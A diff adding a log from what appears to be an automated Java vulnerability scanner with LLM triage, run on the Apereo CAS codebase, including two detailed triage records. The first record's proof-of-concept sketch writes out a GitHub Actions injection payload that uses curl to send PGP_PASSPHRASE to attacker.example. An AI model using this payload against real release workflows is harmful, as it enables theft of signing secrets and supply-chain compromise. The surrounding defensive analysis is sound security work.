@@ -1,0 +1,112 @@
+[javahunter] Log: /Users/andrea/Documents/javahunter/results/run_20260407_124853.log
+[javahunter] Started: 2026-04-07T12:48:53.064574
+[javahunter] Cloning repo...
+[javahunter] Cloning repo...              ✓
+[javahunter] Building project...
+[javahunter] Building project...          ✗ (failed, continuing) gradle build failed
+[javahunter] Running CodeQL...
+[javahunter] Running Semgrep...
+[javahunter] Running SpotBugs...
+[javahunter] Running SpotBugs...          ✓ 0 findings
+[javahunter] Running Joern...
+[javahunter] Running Joern...             ✓ 0 findings
+[javahunter] Running Semgrep...           ✓ 13 findings
+[javahunter] Running CodeQL...            ✗ 0 findings
+[javahunter] Correlating findings...      ✓ 12 deduplicated (top 12 by score)
+[javahunter] Extracting CPG slices...     ✓ 12/12 sliced
+[javahunter] L1 triage...                 ✓ 9 survivors (3 eliminated)
+[javahunter] Vul-RAG retrieval...         ✓ 9/9 enriched
+[javahunter] L1.5 triage (Gemma)...       analysing 9 findings
+[javahunter] L1.5 [1/9] CasSSLContext.java:118 (CWE-326: Inadequate Encryption Strength)
+[javahunter] L1.5 [1/9] 🟡 UNCERTAIN (95%) — The provided code snippet only demonstrates the initialization of a `TrustManage
+[javahunter] L1.5 [2/9] SSLUtils.java:47 (CWE-326: Inadequate Encryption Strength)
+[javahunter] L1.5 [2/9] 🔴 TRUE_POSITIVE (100%) — The use of `SSLContext.getInstance("TLS")` instructs the JVM to allow negotiatio
+[javahunter] L1.5 [3/9] HeimdallAuthorizationController.java:75 (CWE-23: Relative Path Traversal)
+[javahunter] L1.5 [3/9] 🟡 UNCERTAIN (50%) — 
+[javahunter] L1.5 [4/9] ValidateEndpointCommand.java:138 (CWE-326: Inadequate Encryption Strength)
+[javahunter] L1.5 [4/9] 🔴 TRUE_POSITIVE (100%) — The code explicitly requests a generic "TLS" instance, which allows the underlyi
+[javahunter] L1.5 [5/9] application.properties:18 (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor)
+[javahunter] L1.5 [5/9] 🔴 TRUE_POSITIVE (95%) — The configuration explicitly enables `spring.shell.script.enabled`, which allows
+[javahunter] L1.5 [6/9] application.properties:134 (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor)
+[javahunter] L1.5 [6/9] 🟡 UNCERTAIN (50%) — 
+[javahunter] L1.5 [7/9] release.yml:71 (CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'))
+[javahunter] L1.5 [7/9] 🔴 TRUE_POSITIVE (100%) — The GitHub Actions workflow directly interpolates untrusted `inputs` from the `g
+[javahunter] L1.5 [8/9] actuators.html:367 (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor)
+[javahunter] L1.5 [8/9] 🔴 TRUE_POSITIVE (100%) — The code is documentation for a configuration pattern that explicitly instructs 
+[javahunter] L1.5 [9/9] DefaultRelyingPartyTokenProducer.java:44 (CWE-611: Improper Restriction of XML External Entity Reference)
+[javahunter] L1.5 [9/9] 🟡 UNCERTAIN (50%) — 
+[javahunter] L1.5 triage (Gemma)...       ✓ 9 survivors (0 dropped as FP)
+[javahunter] L2 triage (Claude)...        analysing 9 findings
+
+-------- snip --------
+
+
+
+  [
+    {
+      "finding_id": "a2aa9a70-87e1-4df1-b03d-9299964562e6",
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.82,
+      "cwe": "CWE-78",
+      "severity": "HIGH",
+      "cvss_estimate": 7.2,
+      "root_cause": "GitHub Actions workflow_dispatch inputs are interpolated directly via ${{ inputs.* }} expressions into a run: shell block before bash parsing, enabling expression injection.",
+      "attack_vector": "Requires write/admin access to the GitHub repository to trigger workflow_dispatch; injectable via the releaseVersion or nextVersion inputs.",
+      "impact": "Arbitrary command execution in the release CI runner, with access to PGP_PRIVATE_KEY, REPOSITORY_USER, REPOSITORY_PWD, GITHUB_TOKEN — supply-chain compromise of signed Maven artifacts.",
+      "reachable_from_external": false,
+      "authentication_required": true,
+      "vul_rag_match": "Matches the well-documented GitHub Actions expression injection class (see GHSA-*-* advisories for actions injection). Root cause is identical: user-controlled input interpolated into run: before shell tokenisation.",
+      "fix_absent": true,
+      "false_positive_argument": "The workflow_dispatch trigger gates execution behind GitHub authentication and write-level repository permissions, so no unauthenticated external actor can reach this. The check job adds a light pre-condition
+  (is_snapshot check). Downstream, release.sh receives the value as a double-quoted argument, which would neutralise many simple injection attempts IF release.sh re-quotes its positional parameters. The static analyser also cannot see whether
+  GitHub repository settings restrict workflow_dispatch to specific protected branches or required reviewers — both of which would further reduce exploitability. Given that this is an official Apereo CAS release workflow and maintainers are
+  vetted, the realistic attack scenario is a compromised maintainer account rather than a generic external threat.",
+      "poc_sketch": "Trigger workflow_dispatch via GitHub UI or API (requires write token) with releaseVersion = 'x\" && curl https://attacker.example/exfil?k=$PGP_PASSPHRASE && echo \"'. The env var PGP_PASSPHRASE is in scope for the step.",
+      "recommended_fix": "Replace direct expression interpolation with environment variable indirection:\n  env:\n    RELEASE_VERSION: ${{ inputs.releaseVersion }}\n    NEXT_VERSION: ${{ inputs.nextVersion }}\n  run: |\n    ./ci/release.sh
+  --release-version \"$RELEASE_VERSION\" --next-version \"$NEXT_VERSION\"\nThis passes the value through the process environment rather than embedding it in shell source text, preventing injection.",
+      "reasoning_trace": "Step 1 — Read source: Confirmed lines 71-82 of release.yml. The run: block is a multi-line bash heredoc. On line 72, `RELEASE_VERSION=\"${{ inputs.releaseVersion }}\"` and on line 78 `NEXT_VERSION=\"${{
+  inputs.nextVersion }}\"` embed GitHub Actions expression results directly into the script text before the runner invokes bash. GitHub Actions substitutes expressions at template-evaluation time, producing a literal shell script string that
+  bash then parses. Step 2 — Taint trace: (1) User supplies releaseVersion via workflow_dispatch input field or API POST. (2) GitHub Actions expression evaluator substitutes the raw string into the YAML run: block. (3) The resulting shell
+  source text is handed to bash -e. The double-quote wrapping (`\"${{ inputs.releaseVersion }}\"`) does NOT protect against injection — an attacker payload of `x\" && malicious_command && echo \"y` closes the quote, injects a command, and
+  reopens. This is a 3-level taint: workflow input → expression substitution → shell execution. Step 3 — Reachability: workflow_dispatch can be triggered by any GitHub user with repository write access, or via the GitHub REST API with a token
+  carrying the `repo` scope. This is not internet-accessible to anonymous users. However, a stolen PAT or a malicious insider would have this access. The release runner has access to secrets: PGP_PRIVATE_KEY, PGP_PASSPHRASE, REPOSITORY_USER,
+  REPOSITORY_PWD — all needed to sign and publish Maven artifacts to Maven Central. Step 4 — Vul-RAG: This matches CVE-2022-*-class GitHub Actions injection bugs. The root cause is identical to GHSA-p9p4-97g9-wcrh and similar advisories: ${{
+  github.event.* }} or ${{ inputs.* }} in run: blocks. No fix (env: indirection) has been applied here. Step 5 — Forced reflection: The realistic attack path requires a threat actor with write-level GitHub access, making this an insider or
+  account-compromise scenario rather than a remotely exploitable bug. Many organisations use CODEOWNERS, required reviewers for workflows, or restrict workflow_dispatch to protected branches — none of which can be assessed from this file alone.
+   The downstream release.sh script receives the value as a double-quoted shell argument (`\"$RELEASE_VERSION\"`), so if release.sh treats it as a plain string without further eval, the injected payload still executes because the injection
+  happens before release.sh is even invoked. The static analyser correctly identifies the structural pattern. Confidence is not 1.0 because we cannot confirm the absence of additional GitHub Actions workflow protection settings (e.g., required
+  reviewers, environment secrets gating). Step 6 — Verdict: TRUE_POSITIVE, HIGH severity. The fix is well-known: move ${{ inputs.* }} into env: vars and reference those in run:, never embed expressions directly in shell source."
+    },
+    {
+      "finding_id": "2296a0e8-c134-48e0-8c03-25e356dcfe0c",
+      "verdict": "FALSE_POSITIVE",
+      "confidence": 0.97,
+      "cwe": "CWE-200",
+      "severity": "LOW",
+      "cvss_estimate": 0.0,
+      "root_cause": "Semgrep fired on the string 'management.endpoint.*.access=UNRESTRICTED' inside a Jekyll/Liquid documentation template, not in deployed application configuration.",
+      "attack_vector": "N/A — this is a documentation HTML template file, never packaged into the application.",
+      "impact": "None. The file is in docs/cas-server-documentation/_includes_site/ and is rendered into static documentation pages, not loaded by Spring Boot.",
+      "reachable_from_external": false,
+      "authentication_required": false,
+      "vul_rag_match": "No match. CWE-200 actuator exposure requires the property to be present in a runtime application.properties or application.yml that Spring Boot actually loads. This file is neither.",
+      "fix_absent": false,
+      "false_positive_argument": "The file is actuators.html, a Jekyll Liquid template located under docs/cas-server-documentation/_includes_site/. The flagged line (366) is inside a {% capture epc %} block that renders a Markdown code fence as
+   documentation. The value 'UNRESTRICTED' is presented as an example configuration for readers to understand how to enable an endpoint, not as a setting that is actually deployed. The line immediately below (370) explicitly adds the comment '#
+   Choose the proper security access level...' and shows 'cas.monitor.endpoints.endpoint.{{ cfg.name }}.access=PERMIT' as the recommended security-aware alternative. The {{ cfg.name }} token is a Liquid template variable, confirming this is
+  template/documentation code. Semgrep matched on the syntactic pattern of 'management.endpoint.*.access=UNRESTRICTED' without understanding the file type is HTML/Liquid documentation. This is a classic static-analysis over-approximation: the
+  rule fires on any file containing the pattern, regardless of whether the file is runtime configuration.",
+      "poc_sketch": "N/A",
+      "recommended_fix": "No fix needed in the source file. If desired, a Semgrep nosemgrep comment or path exclusion (docs/**) can suppress this finding class in documentation files.",
+      "reasoning_trace": "Step 1 — Read source: Lines 350-388 of actuators.html confirm this is a Jekyll/Liquid template. The file uses Liquid tags ({% capture %}, {%- if -%}, {%- endif -%}) and variable interpolation ({{ cfg.name }}, {{
+  cfg.path }}). The flagged line 366-367 is inside a {% capture epc %}...{% endcapture %} block followed by {{ epc | markdownify }}, which renders the captured string as Markdown for display in the documentation site. Step 2 — File location
+  analysis: Path is docs/cas-server-documentation/_includes_site/actuators.html. This is the CAS documentation Jekyll site, not any part of the server application. Jekyll processes these files to generate static HTML documentation pages. Spring
+   Boot never reads this file. Step 3 — Content analysis: Line 366 reads 'management.endpoint.{{ cfg.name }}.access=UNRESTRICTED' where {{ cfg.name }} is a Liquid variable, making this a template that expands to e.g.
+  'management.endpoint.health.access=UNRESTRICTED' in the rendered docs. Line 370 shows '# cas.monitor.endpoints.endpoint.{{ cfg.name }}.access=PERMIT' as the security-conscious alternative. The documentation is instructing operators on how to
+  configure endpoints, with UNRESTRICTED being the 'this is how you enable it' example and PERMIT being the 'this is how you secure it' recommendation. Step 4 — Vul-RAG: A true CWE-200 actuator exposure would require (a) the property in a
+  runtime Spring Boot config file, (b) no security filter on the /actuator routes, and (c) sensitive data accessible via the endpoint. None of these apply here. Step 5 — Forced reflection: Could this documentation somehow affect runtime
+  behaviour? Only if an operator blindly copy-pastes the UNRESTRICTED example without reading the comment below it, but that is operator misconfiguration, not a code vulnerability in the CAS repository. The scanner cannot be blamed for flagging
+   the pattern — it matches lexically — but as L2 analysts we can rule this out definitively after reading the file. Step 6 — Verdict: FALSE_POSITIVE with 0.97 confidence. The 0.03 residual accounts for the theoretical case where some build
+  tool accidentally incorporates this file into application resources, which would be an unrelated build misconfiguration."
+    }
+  ]
